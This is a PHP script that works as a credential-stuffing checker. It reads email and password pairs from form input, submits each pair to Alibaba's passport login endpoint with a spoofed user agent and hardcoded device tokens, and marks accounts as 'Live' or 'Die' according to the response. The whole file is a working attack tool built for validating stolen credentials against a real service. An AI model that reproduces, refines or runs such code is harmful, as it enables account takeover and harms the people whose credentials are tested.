<?php
require ('./class_curl.php');

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}


if ($_POST['do'] == 'check')
{

    $curl = new curl();
    delete_cookies();
    $curl->ua('Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16');
 

    $result = array();
    $delim = urldecode($_POST['delim']);
    list($email, $pwd) = explode($delim, urldecode($_POST['mailpass']));
//   $sock = urldecode($_POST['IP']);

    if (!$email)
    {
        $result['error'] = -1;
        $result['msg'] = urldecode($_POST['mailpass']);
        echo json_encode($result);
        exit;
    }
    
    delete_cookies();
 //  $curl->sock5($sock);

	if($curl->validate()){
		$fullink='https://passport.alibaba.com/newlogin/login.do?loginId='.$email.'&xloginPassword='.$pwd.'&checkCode=&appName=icbu&appEntrance=default&ua=AAAAdgAnA6IAAAAAAJhvABQBAAYAIHpPl6sBAQAIAAAQxH3%2BQKUCAQAGMAAgEDNzDAEAIQITQyOTU1MTkwNzkwMTowPiI5NTczOTIxMjEzOTgxMTkxMBABYAIPgAERamZ3RWJnLCI8IjktWCJrb2CwEAwgDrAACGR0cHN6Py8gcWNzcH9idH4hbGliYWJhbiNvbW8taW5pb1xvZ2lubihkfW88YW5nbTVub1VzdiFgcH5BbWVtOWNiZXYhYHB1TmRycW5jZW00ZWZhZXxkdiN0eXxlZFlwdW0xZXR%2FZiJpanBRYnFtY302Lm9kfE9hZGNTf2ZZZWd9NmFsY3VmLm9ke0VlYHxPZ2lubTRydXVmKWN9T2JpbGVtNmFsY3VmIn5kbTA%2BJzM1NDExOTU5NjExMDc5NjAwEAIAAAENIAACDPAAAQYwAAAEoAAFAAAAAwAgAAUAAAACCPBwEAEbAAAADwdmbW0sb2dpbm0pZGBwEABgAAAADw1gcBAAYAEAAAYRMHAQARsBAAAGHjZtbSxvZ2lubSlkYHAQARsAAAAGH2ZtbSxvZ2lubSlkYHAQAGAAAAAGG3BQEAHREACQD2AAAAAEJhAGbW0sb2dpbm0gcWNzd39idGBwEABgAQAABCIwcBABcREAAAQsNm1tLG9naW5tIHFjc3d%2FYnRgcBABcRAAAA8ntm1tLG9naW5tIHFjc3d%2FYnRgcBAAYAAAAA8tsHAQAGABAAAETuBwEAFxEQAABE32bW0sb2dpbm0gcWNzd39idGBwEAFxEAAABU4mbW0sb2dpbm0gcWNzd39idGBwEABgAAAABUQwQBABSwAJYAEwAAhNtm1tLG9naW5tKWRgUBABewAJYA4gAAAACkQABm1tLG9naW5tKWRgcBAAYAEAAApCIHAQARsBAAAKRDZtbSxvZ2lubSlkYGAQASsBEAAACkt2bW0sb2dpbm0pZGBgEAErBlEAAAtAdm1tLG9naW5tKWRgcBABGwAAAARbFm1tLG9naW5tKWRgcBAAYAAAAARVQHAQAGABAAAE%2BFBwEAEbAQAABPtmbW0sb2dpbm0pZGBwEAEbAAABBx2GbW0sb2dpbm0pZGBwEABgAAABBxSgcBAAYAEAAQAp4HAQARsBAAEAK%2FZtbSxvZ2lubSlkYFAQAb8ACiAJkAAAAQEqAAZtbSxvZ2lubSN1cm1pZHBwEAEbAAABASsWbW0sb2dpbm0pZGBwEAFfAQABASUmbW0sb2dpbm0jdXJtaWRw%3D%3D&hsid=IQ966H81-3QEZI3NEHUHRT0WDG02R2-O8XA6Q8I-PR0O1&cid=2ff05a68-20f0-4750-9fa0-c92d3cc3b317&rdsToken=&umidToken=P60b524acbadf234f161ecb19624b381d&isRequiresHasTimeout=false&isRDSReady=true&isUMIDReady=true&umidGetStatusVal=255&lrfcf=55f8a486f9bbe98d8750f8adb1316161&lang=en_us&scene=&isMobile=false&screenPixel=1280x800&navlanguage=pt-BR&navUserAgent=Mozilla%2F5.0+%28Windows+NT+6.3%3B+rv%3A37.0%29+Gecko%2F20100101+Firefox%2F37.0&navAppVersion=&navPlatform=Win32&_csrf_token=egbrAewwocRG8Jc0D5G497';
		$curl->page($fullink);
		
		if($curl->validate()){
		
		
		//	file_put_contents('2.html', $curl->content);
			 
			 if(stripos($curl->content, '"isCheckCodeShowed":true') !== false){
			 	$result['error'] = 0;
				$result['msg'] = '<b style="color:yellow;">Live</b> => ' . $sock . ' | ' . $email .
                        ' | ' .$pwd.'| www.technologychecker.us'; 
			 

			 }
			 elseif(stripos($curl->content, '"titleMsg":"Please enter the verification code."') !== false){
			 
				$result['error'] = 2;
                $result['msg'] = '<b style="color:red;">Die</b> => ' . $email . ' | ' . $pwd.' | Checked'; 

			 }
			
			 else{
			 
					 
			 	$result['error'] = 2;
                $result['msg'] = '<b style="color:red;">Cant Check</b> => ' . $email . ' | ' . $pwd.' | Checked'; 
			 }
			
							
		}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Die/Timeout1';
	
		}	
		
	
	
	}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Die/Timeout1';
	
	}
	
	

    echo json_encode($result);
    exit;

}

?>